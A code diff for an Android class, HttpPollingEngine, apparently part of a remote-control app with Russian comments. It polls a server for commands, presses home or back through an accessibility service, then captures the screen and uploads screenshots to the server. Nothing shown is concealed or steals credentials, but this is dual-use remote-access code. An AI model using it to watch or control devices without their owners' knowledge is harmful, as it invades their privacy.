@@ -1,6 +1,7 @@
 package com.remotecontrol;
 
 import android.content.Context;
+import android.content.Intent;
 import android.util.Log;
 import okhttp3.MediaType;
 import okhttp3.OkHttpClient;
@@ -22,37 +23,30 @@ public class HttpPollingEngine implements Runnable {
         this.context = context.getApplicationContext();
         this.httpClient = new OkHttpClient.Builder()
                 .connectTimeout(10, TimeUnit.SECONDS)
-                .readTimeout(15, TimeUnit.SECONDS)
                 .build();
     }
 
-    public void stop() {
-        running = false;
-    }
+    public void stop() { running = false; }
 
     @Override
     public void run() {
         while (running) {
             try {
-                Request request = new Request.Builder()
-                        .url(Config.ENDPOINT_GET_COMMAND)
-                        .get()
-                        .build();
-
+                Request request = new Request.Builder().url(Config.ENDPOINT_GET_COMMAND).get().build();
                 try (Response response = httpClient.newCall(request).execute()) {
                     if (response.isSuccessful()) {
                         String body = response.body().string();
                         if (!body.equals("wait")) {
-                            Log.d(TAG, "Команда: " + body);
+                            Log.d(TAG, "Выполнение: " + body);
                             handleCommand(new JSONObject(body));
-                            sendAck();
+                            sendAck(); // Сообщаем серверу, что команда принята
                         }
                     }
                 }
-                Thread.sleep(1500);
+                Thread.sleep(1000);
             } catch (Exception e) {
-                Log.e(TAG, "Ошибка опроса: " + e.getMessage());
-                try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
+                Log.e(TAG, "Ошибка: " + e.getMessage());
+                try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
             }
         }
     }
@@ -69,36 +63,34 @@ public class HttpPollingEngine implements Runnable {
                 service.pressHome();
             } else if (action.equals("back")) {
                 service.pressBack();
-            } else if (action.equals("recents")) {
-                service.pressRecents();
             }
-            // После любой команды пробуем сделать скриншот
-            context.startActivity(new android.content.Intent(context, ScreenCaptureRequestActivity.class)
-                    .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK));
+
+            // ВАЖНО: Запрашиваем скриншот СРАЗУ после действия
+            Intent intent = new Intent(context, ScreenCaptureRequestActivity.class);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(intent);
+
         } catch (Exception e) {
-            Log.e(TAG, "Ошибка команды: " + e.getMessage());
+            Log.e(TAG, "handleCommand Error: " + e.getMessage());
         }
     }
 
     private void sendAck() {
-        Request req = new Request.Builder().url(Config.ENDPOINT_ACK).get().build();
-        try { httpClient.newCall(req).execute().close(); } catch (Exception ignored) {}
+        // Эндпоинт /ack должен быть добавлен в Config.java
+        Request req = new Request.Builder().url(Config.BASE_URL + "/ack").get().build();
+        try (Response res = httpClient.newCall(req).execute()) {
+            Log.d(TAG, "ACK sent: " + res.code());
+        } catch (IOException ignored) {}
     }
 
     public void uploadScreenshot(File file) {
         if (file == null || !file.exists()) return;
-        
-        // Отправка картинки как Binary Body
         RequestBody body = RequestBody.create(file, MediaType.parse("image/jpeg"));
-        Request req = new Request.Builder()
-                .url(Config.ENDPOINT_UPLOAD)
-                .post(body)
-                .build();
-
+        Request req = new Request.Builder().url(Config.ENDPOINT_UPLOAD).post(body).build();
         try (Response resp = httpClient.newCall(req).execute()) {
-            Log.i(TAG, "Upload: " + resp.code());
+            Log.i(TAG, "Скриншот загружен: " + resp.code());
         } catch (IOException e) {
-            Log.e(TAG, "Upload error: " + e.getMessage());
+            Log.e(TAG, "Ошибка загрузки: " + e.getMessage());
         } finally {
             file.delete();
         }
